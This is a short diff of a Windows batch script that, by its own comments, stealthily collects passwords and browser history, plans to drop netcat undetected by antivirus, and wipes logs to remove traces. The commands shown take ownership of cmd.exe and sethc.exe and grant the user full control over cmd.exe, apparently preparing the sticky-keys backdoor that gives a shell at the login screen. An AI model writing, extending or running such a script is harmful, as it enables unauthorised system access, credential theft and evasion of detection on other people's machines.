@@ -1,5 +1,5 @@
 @echo off
-REM stealthily grabs  passwords and browser history from windows systems
+REM stealthily grabs  passwords and browser history from windows systems, and drops a netcat?? undetectable by antivirus
 
 REM checking OS type
 set TypeofOS=0
@@ -26,11 +26,11 @@ REM get system information
 REM type Booty\*.csv >> Booty\master_password_list.csv
 
 
-REM add nc listener
+REM add nc
 REM remove all traces of activity
-REM put sticky keys back to normal
 REM wipe the logs
 
+REM put sticky keys back to normal
 takeown /f c:\windows\system32\cmd.exe
 takeown /f c:\windows\system32\sethc.exe
 icacls c:\windows\system32\cmd.exe /grant %username%:F /q /t
